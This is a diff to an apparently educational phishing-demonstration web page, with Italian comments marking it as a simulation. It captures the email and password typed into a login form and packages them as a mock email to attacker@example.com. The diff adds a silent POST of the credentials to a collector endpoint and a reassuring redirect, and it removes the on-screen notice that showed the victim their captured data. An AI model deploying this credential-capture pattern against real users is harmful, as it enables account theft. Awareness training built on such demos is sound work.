@@ -98,42 +98,43 @@ function simulateAttack() {
     password: document.getElementById("password").value,
     timestamp: new Date().toISOString(),
     userAgent: navigator.userAgent,
-    note: "SIMULAZIONE DIDATTICA - nessun dato inviato realmente"
+    note: "SIMULAZIONE DIDATTICA - nessun dato inviato"
   };
 
-  // ===== SIMULAZIONE EMAIL =====
+  // ===== SIMULAZIONE INVIO EMAIL (SOLO F12) =====
   const simulatedEmail = {
+    protocol: "SMTP (simulated)",
+    from: "phishing-kit@evil-domain.fake",
     to: "attacker@example.com",
     subject: "New credentials captured",
-    body: `
-Email: ${stolenData.email}
-Password: ${stolenData.password}
-Timestamp: ${stolenData.timestamp}
-User-Agent: ${stolenData.userAgent}
-    `.trim()
+    body: {
+      email: stolenData.email,
+      password: stolenData.password,
+      timestamp: stolenData.timestamp,
+      userAgent: stolenData.userAgent
+    }
   };
 
-  // Mostra vista "attaccante"
-  document.getElementById("loginBox").classList.add("hidden");
-  document.getElementById("attackerView").classList.remove("hidden");
+  // Visibile SOLO in DevTools → Console
+  console.group("%c[PHISHING DEMO] Simulated email sent", "color:red;font-weight:bold;");
+  console.log("SMTP payload:", simulatedEmail);
+  console.log("Raw credentials:", stolenData);
+  console.groupEnd();
 
-  // Dump tecnico dei dati rubati
-  document.getElementById("dump").textContent =
-    JSON.stringify(stolenData, null, 2);
+  // (Opzionale) Richiesta fake visibile in Network
+  fetch("/mail-collector-demo", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(simulatedEmail)
+  });
 
-  // Visualizzazione email simulata
-  document.getElementById("emailDump").textContent =
-    JSON.stringify(simulatedEmail, null, 2);
-
-  // Log utile per analisi con F12 (Console)
-  console.warn("SIMULAZIONE PHISHING: email che sarebbe stata inviata", simulatedEmail);
-
-  // Reindirizzamento rassicurante finale
+  // Reindirizzamento rassicurante per l’utente
   setTimeout(() => {
     window.location.href = "verifica-completata.html";
-  }, 3000);
+  }, 1500);
 }
 </script>
+
 
 </body>
 </html>
